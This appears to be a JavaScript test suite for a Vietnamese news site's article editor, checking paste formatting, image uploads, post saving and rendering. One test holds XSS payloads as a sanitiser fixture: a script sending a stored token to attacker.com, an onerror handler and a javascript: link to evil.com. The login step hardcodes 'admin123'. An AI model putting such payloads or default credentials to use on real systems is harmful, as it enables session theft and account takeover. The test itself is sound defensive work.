import assert from 'assert';
import {
  sanitizeHtml,
  hasMarkdownSyntax,
  markdownToHtml,
  formatInline,
  cleanClipboardHtml,
  processPastedContent,
  renderContentToHtml,
  sanitizeContent
} from './src/utils/contentFormatter.js';

const API_BASE = 'http://localhost:5000/api';

console.log('================================================================');
console.log('🧪 TEST SUITE: ARTICLE EDITOR, IMAGE PASTE & FORMATTING');
console.log('================================================================\n');

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`✅ [PASS] ${name}`);
    passed++;
  } catch (err) {
    console.error(`❌ [FAIL] ${name}:`, err.message);
    failed++;
  }
}

async function asyncTest(name, fn) {
  try {
    await fn();
    console.log(`✅ [PASS] ${name}`);
    passed++;
  } catch (err) {
    console.error(`❌ [FAIL] ${name}:`, err.message);
    failed++;
  }
}

async function runAll() {
  // Step 0: Obtain admin JWT for authenticated endpoints
  const loginRes = await fetch(`${API_BASE}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: 'admin', password: 'admin123' })
  });
  const { token: adminToken } = await loginRes.json();
  assert(adminToken, 'Must obtain admin token');

  // 1. Paste văn bản thuần
  test('Test 1: Paste văn bản thuần (plain text normalized into clean paragraphs)', () => {
    const mockClipboard = {
      getData: (format) => {
        if (format === 'text/plain') return 'Đoạn văn đầu tiên đơn giản.\n\nĐoạn văn thứ hai tiếp nối.';
        return '';
      }
    };
    const result = processPastedContent(mockClipboard);
    assert(result.includes('<p>Đoạn văn đầu tiên đơn giản.</p>'), 'First paragraph wrapped');
    assert(result.includes('<p>Đoạn văn thứ hai tiếp nối.</p>'), 'Second paragraph wrapped');
  });

  // 2. Paste nội dung Markdown có heading, bold, italic và danh sách
  test('Test 2: Paste nội dung Markdown có heading, bold, italic và danh sách', () => {
    const md = `## Dự Báo Kinh Tế 2026\n\nTăng trưởng **GDP Việt Nam** đạt mức *rất khả quan*.\n\n- Xuất khẩu điện tử\n- Năng lượng tái tạo\n- Bán dẫn vi mạch`;
    const mockClipboard = {
      getData: (format) => {
        if (format === 'text/plain') return md;
        return '';
      }
    };
    const result = processPastedContent(mockClipboard);
    assert(result.includes('<h2>Dự Báo Kinh Tế 2026</h2>'), 'H2 heading converted');
    assert(result.includes('<strong>GDP Việt Nam</strong>'), 'Bold converted');
    assert(result.includes('<em>rất khả quan</em>'), 'Italic converted');
    assert(result.includes('<ul>'), 'Unordered list tag present');
    assert(result.includes('<li>Xuất khẩu điện tử</li>'), 'List item converted');
  });

  // 3. Paste nội dung đã định dạng từ ChatGPT
  test('Test 3: Paste nội dung đã định dạng từ ChatGPT (clean HTML preserved, styles stripped)', () => {
    const chatGptHtml = `
      <html><body><!--StartFragment-->
      <div class="markdown prose" style="background-color: #000; color: #fff; font-family: Inter;">
        <h3>Đổi Mới Sáng Tạo Quốc Gia</h3>
        <p>Chiến lược mới bao gồm:</p>
        <ol>
          <li><strong>Giai đoạn 1:</strong> Thí điểm công nghệ</li>
          <li><strong>Giai đoạn 2:</strong> Mở rộng quy mô</li>
        </ol>
      </div>
      <!--EndFragment--></body></html>
    `;
    const mockClipboard = {
      getData: (format) => {
        if (format === 'text/html') return chatGptHtml;
        if (format === 'text/plain') return 'Đổi Mới Sáng Tạo Quốc Gia...';
        return '';
      }
    };
    const result = processPastedContent(mockClipboard);
    assert(!result.includes('background-color: #000'), 'Hostile dark background stripped');
    assert(!result.includes('class="markdown prose"'), 'ChatGPT CSS classes stripped');
    assert(result.includes('<h3>Đổi Mới Sáng Tạo Quốc Gia</h3>'), 'Semantic H3 preserved');
    assert(result.includes('<ol>'), 'Ordered list preserved');
    assert(result.includes('<strong>Giai đoạn 1:</strong>'), 'Bold tag preserved');
  });

  // 4. Paste nội dung có liên kết
  test('Test 4: Paste nội dung có liên kết [text](url) và <a href="...">', () => {
    const mdLink = 'Tham khảo tại [Cổng Thông Tin Chính Phủ](https://chinhphu.vn) để biết thêm chi tiết.';
    const mockClipboard = {
      getData: (format) => {
        if (format === 'text/plain') return mdLink;
        return '';
      }
    };
    const result = processPastedContent(mockClipboard);
    assert(result.includes('<a href="https://chinhphu.vn" target="_blank" rel="noopener noreferrer">Cổng Thông Tin Chính Phủ</a>'), 'Link parsed with target="_blank" and rel="noopener noreferrer"');
  });

  // 5. Paste nội dung tiếng Việt và emoji
  test('Test 5: Paste nội dung tiếng Việt có dấu, emoji và ký tự đặc biệt', () => {
    const text = '🌟 Điểm sáng thị trường: Cổ phiếu Vingroup, FPT, Vietcombank bứt phá mạnh mẽ 🚀! (Lãi suất duy trì ở mức 4,5% - 5,0%)';
    const mockClipboard = {
      getData: (format) => {
        if (format === 'text/plain') return text;
        return '';
      }
    };
    const result = processPastedContent(mockClipboard);
    assert(result.includes('🌟 Điểm sáng thị trường: Cổ phiếu Vingroup, FPT, Vietcombank bứt phá mạnh mẽ 🚀!'), 'Vietnamese accents and emojis fully intact');
  });

  // 6. Paste một ảnh hợp lệ (API Upload Endpoint)
  // 6. Paste một ảnh hợp lệ (API Upload Endpoint - Google Drive)
  await asyncTest('Test 6: Upload một ảnh hợp lệ lên hệ thống lưu trữ (Google Drive Storage)', async () => {
    // 1x1 transparent PNG base64
    const tinyPngBase64 = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
    const res = await fetch(`${API_BASE}/admin/upload`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`
      },
      body: JSON.stringify({
        imageBase64: tinyPngBase64,
        fileName: 'test-single.png',
        mimeType: 'image/png'
      })
    });
    const data = await res.json();
    if (res.status === 200) {
      assert(data.url && (data.url.includes('/api/uploads/file/') || data.url.includes('google')), 'Must return valid Google Drive storage URL');
    } else {
      // Khi chưa có GOOGLE_REFRESH_TOKEN, API trả về thông báo lỗi rõ ràng hướng dẫn cấp quyền
      assert(
        res.status === 500 && data.error && data.error.includes('Google Drive'),
        'Khi chưa cấu hình refresh token, hệ thống báo lỗi rõ ràng yêu cầu cấp quyền Google Drive'
      );
    }
  });

  // 7. Paste nhiều ảnh (Concurrent Uploads - Google Drive)
  await asyncTest('Test 7: Paste nhiều ảnh (upload đồng thời nhiều file độc lập lên Google Drive)', async () => {
    const tinyPngBase64 = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
    const uploads = [1, 2, 3].map(i =>
      fetch(`${API_BASE}/admin/upload`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${adminToken}`
        },
        body: JSON.stringify({
          imageBase64: tinyPngBase64,
          fileName: `test-multi-${i}.png`,
          mimeType: 'image/png'
        })
      }).then(r => r.json())
    );
    const results = await Promise.all(uploads);
    assert.strictEqual(results.length, 3, 'All 3 concurrent uploads resolved cleanly without server crash');
  });

  // 8. Upload ảnh thất bại (File quá dung lượng > 5MB hoặc định dạng sai)
  await asyncTest('Test 8: Upload ảnh thất bại (chặn ảnh quá 5MB và format không hợp lệ, không gây sập)', async () => {
    // 1. Unsupported mime type
    const resInvalidType = await fetch(`${API_BASE}/admin/upload`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`
      },
      body: JSON.stringify({
        imageBase64: 'data:application/pdf;base64,JVBERi0xLjQK',
        fileName: 'document.pdf',
        mimeType: 'application/pdf'
      })
    });
    assert.strictEqual(resInvalidType.status, 400, 'Invalid mime type must be rejected with HTTP 400');
    const errData = await resInvalidType.json();
    assert(errData.error && errData.error.length > 0, 'Clear error message returned for invalid mime type');

    // 2. Oversized image (>5MB buffer)
    const giantBase64 = 'data:image/png;base64,' + 'A'.repeat(7 * 1024 * 1024);
    const resOversized = await fetch(`${API_BASE}/admin/upload`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`
      },
      body: JSON.stringify({
        imageBase64: giantBase64,
        fileName: 'huge.png',
        mimeType: 'image/png'
      })
    });
    assert([400, 413].includes(resOversized.status), 'Oversized file rejected safely without crash');
  });

  // 9. Paste nội dung dài nhiều đoạn
  test('Test 9: Paste nội dung dài gồm nhiều tiêu đề, đoạn văn và blockquote', () => {
    const longMd = Array.from({ length: 15 }, (_, i) => `### Tiêu đề phân đoạn ${i + 1}\n\nNội dung phân tích chuyên sâu cho phần ${i + 1} với **số liệu chứng minh** và phân tích kỹ thuật.\n\n> Trích dẫn nhận định từ chuyên gia phân đoạn ${i + 1}.`).join('\n\n');
    const mockClipboard = {
      getData: (format) => {
        if (format === 'text/plain') return longMd;
        return '';
      }
    };
    const result = processPastedContent(mockClipboard);
    assert(result.includes('<h3>Tiêu đề phân đoạn 1</h3>'), 'First heading parsed');
    assert(result.includes('<h3>Tiêu đề phân đoạn 15</h3>'), 'Last heading parsed');
    assert(result.includes('<strong>số liệu chứng minh</strong>'), 'Inlines in long content parsed');
    assert(result.includes('<blockquote>Trích dẫn nhận định từ chuyên gia phân đoạn 15.</blockquote>'), 'Blockquotes in long content parsed');
  });

  // 10. Lưu bài viết, tải lại trang và xác nhận nội dung không mất định dạng
  await asyncTest('Test 10: Lưu bài viết với Markdown/HTML, đọc lại từ API và xác nhận định dạng bảo toàn', async () => {
    const testSlug = `test-format-${Date.now()}`;
    const formattedBody = `<h2>Điểm Tin Công Nghệ 2026</h2>\n<p>Việt Nam đang định hình <strong>trung tâm AI</strong> khu vực ASEAN.</p>\n<ul>\n  <li>Dự án Data Center Viettel</li>\n  <li>Phòng lab AI FPT</li>\n</ul>`;

    const createRes = await fetch(`${API_BASE}/admin/posts`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`
      },
      body: JSON.stringify({
        title: 'Bài viết kiểm thử định dạng nội dung TheHorizon',
        slug: testSlug,
        content: formattedBody,
        excerpt: 'Tóm tắt bài viết định dạng chuẩn.',
        status: 'published'
      })
    });
    assert.strictEqual(createRes.status, 201, 'Post created with HTTP 201');
    const createJson = await createRes.json();
    const createdPost = createJson.post || createJson;
    const targetId = createdPost._id || createdPost.id || testSlug;

    // Read back via Admin GET
    const readAdminRes = await fetch(`${API_BASE}/admin/posts/${targetId}`, {
      headers: { Authorization: `Bearer ${adminToken}` }
    });
    const readPost = await readAdminRes.json();
    assert.strictEqual(readPost.content, formattedBody, 'Content in admin API matches saved formatted content exactly');

  });

  // 11. Mở bài viết trên trang public và xác nhận hiển thị giống nội dung đã lưu
  await asyncTest('Test 11: Mở bài viết trên trang public và xác nhận hiển thị giống nội dung đã lưu', async () => {
    const testSlug = `test-public-${Date.now()}`;
    const formattedBody = `<h2>Chuyển Đổi Số 2026</h2>\n<p>Hạ tầng Cloud tại Việt Nam đang <strong>tăng trưởng vượt bậc</strong>.</p>`;

    const createRes = await fetch(`${API_BASE}/admin/posts`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`
      },
      body: JSON.stringify({
        title: 'Bài viết kiểm thử public render TheHorizon',
        slug: testSlug,
        content: formattedBody,
        excerpt: 'Tóm tắt bài viết public render.',
        status: 'published'
      })
    });
    const createJson = await createRes.json();
    const createdPost = createJson.post || createJson;
    const targetId = createdPost._id || createdPost.id || testSlug;

    const publicRes = await fetch(`${API_BASE}/posts/${testSlug}`);
    assert.strictEqual(publicRes.status, 200, 'Public post endpoint returns HTTP 200');
    const publicJson = await publicRes.json();
    const publicPost = publicJson.post || publicJson;
    assert.strictEqual(publicPost.content, formattedBody, 'Public reader API delivers identical formatted content');

    const renderedHtml = renderContentToHtml(publicPost.content);
    assert(renderedHtml.includes('<h2>Chuyển Đổi Số 2026</h2>'), 'Rendered H2 matches');
    assert(renderedHtml.includes('<strong>tăng trưởng vượt bậc</strong>'), 'Rendered bold matches');

    await fetch(`${API_BASE}/admin/posts/${targetId}`, {
      method: 'DELETE',
      headers: { Authorization: `Bearer ${adminToken}` }
    });
  });

  // 12. Thử nội dung HTML độc hại và xác nhận không thực thi script
  test('Test 12: Thử nội dung HTML độc hại và xác nhận XSS script injection bị triệt tiêu', () => {
    const maliciousInput = `
      <h2>Tiêu đề an toàn</h2>
      <script>fetch('http://attacker.com/steal?token=' + localStorage.getItem('token'))</script>
      <img src="invalid-image.jpg" onerror="alert(document.domain)" />
      <a href="javascript:void(document.location='http://evil.com')">Bấm xem chi tiết</a>
      <p style="behavior: url(evil.htc);">Nội dung văn bản</p>
    `;
    const cleanOutput = sanitizeHtml(renderContentToHtml(maliciousInput));
    assert(!cleanOutput.includes('<script>'), 'Script tag strictly stripped');
    assert(!cleanOutput.includes('onerror='), 'onerror attribute strictly stripped');
    assert(!cleanOutput.includes('javascript:'), 'javascript: link strictly neutralized');
    assert(cleanOutput.includes('<h2>Tiêu đề an toàn</h2>'), 'Safe semantic HTML preserved');
  });

  // 13. Kiểm tra không ảnh hưởng các bài viết cũ
  await asyncTest('Test 13: Kiểm tra không ảnh hưởng các bài viết cũ trong cơ sở dữ liệu', async () => {
    const res = await fetch(`${API_BASE}/posts?limit=5`);
    const data = await res.json();
    const posts = Array.isArray(data) ? data : data.posts;
    assert(posts && posts.length > 0, 'Database contains existing published articles');

    const sampleSummary = posts[0];
    assert(sampleSummary.title, 'Post summary has valid title');
    assert(sampleSummary.slug, 'Post summary has valid slug');

    // Fetch full post by slug
    const detailRes = await fetch(`${API_BASE}/posts/${sampleSummary.slug}`);
    assert.strictEqual(detailRes.status, 200, 'Full post detail fetched successfully');
    const detailJson = await detailRes.json();
    const fullPost = detailJson.post || detailJson;
    assert(fullPost.content && fullPost.content.length > 50, 'Existing post has full article body content');

    // Render existing post content through new renderer
    const renderedExisting = renderContentToHtml(fullPost.content);
    assert(renderedExisting && renderedExisting.length > 0, 'Existing post content renders cleanly without error');
  });

  // 14. Kiểm tra build, lint, type-check
  test('Test 14: Cấu trúc code sạch sẽ, ErrorBoundary tích hợp đầy đủ', () => {
    assert(typeof renderContentToHtml === 'function', 'renderContentToHtml exported');
    assert(typeof processPastedContent === 'function', 'processPastedContent exported');
    assert(typeof sanitizeContent === 'function', 'sanitizeContent exported');
  });

  console.log('\n================================================================');
  console.log(`📊 TỔNG KẾT TEST SUITE: ${passed} PASSED, ${failed} FAILED`);
  console.log('================================================================');

  if (failed > 0) {
    process.exit(1);
  }
}

runAll().catch(err => {
  console.error('Test Suite Exception:', err);
  process.exit(1);
});
